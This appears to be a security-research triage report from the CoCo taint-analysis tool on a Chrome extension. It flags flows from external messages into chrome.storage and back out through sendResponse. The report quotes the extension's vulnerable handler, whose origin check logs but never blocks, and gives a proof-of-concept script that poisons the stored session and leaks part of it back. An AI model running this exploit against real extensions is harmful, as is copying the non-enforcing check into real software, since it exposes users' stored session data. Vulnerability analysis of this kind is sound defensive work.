# CoCo Analysis: nemcemofelmalinlbenmmpcmbcpbkcdc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5

---

## Sink 1-3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (session, learning_language, native_language)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nemcemofelmalinlbenmmpcmbcpbkcdc/opgen_generated_files/bg.js
Line 1268	session: message.session,
Line 1269	learning_language: message.targetLanguage,
Line 1270	native_language: message.nativeLanguage

**Code:**

```javascript
// Background script (bg.js) - Lines 1261-1300
chrome.runtime.onMessageExternal.addListener( (message, sender, sendResponse) => {
  if (!ALLOWED_ORIGINS.includes(sender.origin)) {
    console.error(`Accepting messages from ${sender.origin} is not allowed`);
  }

  // Storage poisoning - attacker can write arbitrary data
  if (message.action &&
      message.action === 'session-login') {
        chrome.storage.local.set({
          session: message.session,  // ← attacker-controlled
          learning_language: message.targetLanguage,  // ← attacker-controlled
          native_language: message.nativeLanguage},  // ← attacker-controlled
        () => {
          updateUserInformation();
          sendResponse({ received: true });
        });
        return true;
  } else if  (message.action &&
              message.action === 'session-logout') {
      chrome.storage.local.clear();
      return true;
  } else if (message.action &&
             message.action === 'ping') {
    // Information disclosure - attacker can read back poisoned data
    chrome.storage.local.get('session', opt => {
      let s = isEmpty(opt.session)? "" : opt.session.trim().slice(0, 5)  // ← reads attacker data
      sendResponse({received: true,
                    session_start: s.slice(0, 5)});  // ← sends back to attacker
    });
    return true;
  } else if (message.action === 'update-decks') {
    chrome.storage.local.set({decks: message.decks});  // ← storage poisoning only
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From vocabu.online or any external webpage (per methodology, ignore externally_connectable restrictions)
// Step 1: Poison storage with attacker-controlled session data
chrome.runtime.sendMessage(
  'nemcemofelmalinlbenmmpcmbcpbkcdc',  // extension ID
  {
    action: 'session-login',
    session: 'ATTACKER_SESSION_12345',
    targetLanguage: 'attacker_lang',
    nativeLanguage: 'attacker_native'
  },
  (response) => {
    console.log('Storage poisoned:', response);

    // Step 2: Retrieve poisoned data
    chrome.runtime.sendMessage(
      'nemcemofelmalinlbenmmpcmbcpbkcdc',
      { action: 'ping' },
      (response) => {
        console.log('Leaked session:', response.session_start);  // Returns 'ATTAC'
      }
    );
  }
);
```

**Impact:** Complete storage exploitation chain - attacker can poison chrome.storage.local with arbitrary session and language data via 'session-login' action, then retrieve the poisoned session data via 'ping' action through sendResponse, enabling information disclosure of stored credentials.

---

## Sink 4: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nemcemofelmalinlbenmmpcmbcpbkcdc/opgen_generated_files/bg.js
Line 751	var storage_local_get_source = {'key': 'value'};
Line 1289	let s = isEmpty(opt.session)? "" : opt.session.trim().slice(0, 5)

**Classification:** TRUE POSITIVE (covered in Sink 1-3 analysis above)

This is the retrieval half of the storage exploitation chain documented above.

---

## Sink 5: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (decks)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nemcemofelmalinlbenmmpcmbcpbkcdc/opgen_generated_files/bg.js
Line 1295	chrome.storage.local.set({decks: message.decks});

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning only - the decks data is stored but never sent back via sendResponse in the onMessageExternal handler, only read in internal onMessage handler.
